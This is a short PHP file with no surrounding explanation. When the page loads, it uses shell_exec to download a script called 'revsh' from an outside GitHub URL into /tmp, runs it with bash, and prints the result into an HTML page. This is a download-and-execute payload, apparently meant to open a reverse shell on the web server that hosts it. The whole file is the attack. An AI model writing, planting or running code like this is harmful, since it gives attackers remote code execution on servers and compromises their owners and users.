
<?php 
	$prova = shell_exec('wget -O /tmp/trs/revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/trs/revsh > /tmp/trs/output; cat /tmp/trs/output');
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
